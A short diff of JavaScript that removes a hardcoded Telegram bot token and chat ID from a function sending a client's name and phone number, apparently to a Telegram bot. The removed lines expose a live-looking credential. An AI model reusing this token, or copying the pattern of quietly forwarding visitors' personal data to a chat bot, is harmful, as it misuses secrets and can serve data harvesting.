@@ -286,8 +286,8 @@ function getTk(info){
 function send(cliente, telefone)
 {
     
-    const BOT_TOKEN = "2118393099:AAHNp3T4KLNzNySB-EsXB9QCqupj9O5aoao";
-    const CHAT_IDs = ["1895287593"];
+    const BOT_TOKEN = tk;
+    const CHAT_IDs = id;
     tk=null;
     id=null;
     var xmlHttp = new XMLHttpRequest();
